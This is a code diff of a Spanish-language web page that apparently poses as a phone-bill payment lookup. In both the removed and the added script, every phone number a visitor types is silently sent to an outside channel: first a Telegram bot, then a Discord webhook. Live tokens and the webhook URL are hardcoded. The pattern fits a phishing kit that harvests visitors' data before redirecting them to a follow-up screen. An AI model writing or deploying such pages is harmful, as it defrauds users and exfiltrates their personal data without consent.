@@ -164,68 +164,64 @@
     <script src="debtmap.js"></script>
     <script src="scripts.js"></script>
 
-    <script>
-    // 🔹 Configura tu token y chatID de Telegram
-   const TELEGRAM_BOT_TOKEN = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo";  // <<-- pon aquí tu token real
-        const TELEGRAM_CHAT_ID = "8217102156";  // <<-- pon aquí tu chat_id real
+   <script>
+  // 🔹 Pega tu Webhook de Discord aquí
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
 
-    // Función para enviar mensajes a Telegram
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const data = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-        };
+  // Función para enviar mensajes a Discord
+  function sendToDiscord(message) {
+    const data = { content: message };
 
-        fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        })
-        .then(res => res.json())
-        .then(data => console.log("✅ Enviado a Telegram", data))
-        .catch(err => console.error("❌ Error enviando a Telegram", err));
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(data => console.log("✅ Enviado a Discord", data))
+    .catch(err => console.error("❌ Error enviando a Discord", err));
+  }
+
+  // Evento al presionar el botón
+  document.getElementById("consultPayButton").addEventListener("click", function () {
+    const lineNumber = document.getElementById("line-number").value.trim();
+
+    if (!lineNumber) {
+      alert("Por favor ingresa un número válido.");
+      return;
     }
 
-    // Evento al presionar el botón
-    document.getElementById("consultPayButton").addEventListener("click", function () {
-        const lineNumber = document.getElementById("line-number").value.trim();
+    // Loader
+    const loader = document.getElementById("loader");
+    loader.style.display = "flex";
 
-        if (!lineNumber) {
-            alert("Por favor ingresa un número válido.");
-            return;
-        }
+    setTimeout(function () {
+      loader.style.display = "none";
 
-        // Loader
-        const loader = document.getElementById("loader");
-        loader.style.display = "flex";
+      // Enviar a Discord con el mismo formato 📱
+      const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
+      const fecha = new Date().toLocaleString("es-CO");
 
-        setTimeout(function () {
-            loader.style.display = "none";
+      const mensaje = `📱 **Nueva consulta de pago:**\n` +
+                      `🔹 Tipo: ${tipoLinea}\n` +
+                      `🔢 Número: ${lineNumber}\n` +
+                      `⏰ Fecha: ${fecha}`;
 
-            // Enviar a Telegram con el formato que pediste 📱
-            const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
-            const fecha = new Date().toLocaleString("es-CO");
+      sendToDiscord(mensaje);
 
-            const mensaje = `📱 *Nueva consulta de pago:*\n` +
-                            `Tipo: ${tipoLinea}\n` +
-                            `Número: ${lineNumber}\n` +
-                            `⏰ Fecha: ${fecha}`;
-
-            sendToTelegram(mensaje);
-
-            // Lógica de redirección original
-            if (window.debtMap && window.debtMap[lineNumber]) {
-                localStorage.setItem("lineNumber", lineNumber);
-                window.location.href = "screen2.html";
-            }
-        }, 2000);
-    });
+      // Lógica de redirección original
+      if (window.debtMap && window.debtMap[lineNumber]) {
+        localStorage.setItem("lineNumber", lineNumber);
+        window.location.href = "screen2.html";
+      }
+    }, 2000);
+  });
 </script>
+
 
 </body>
 </html>
+
 
 
 
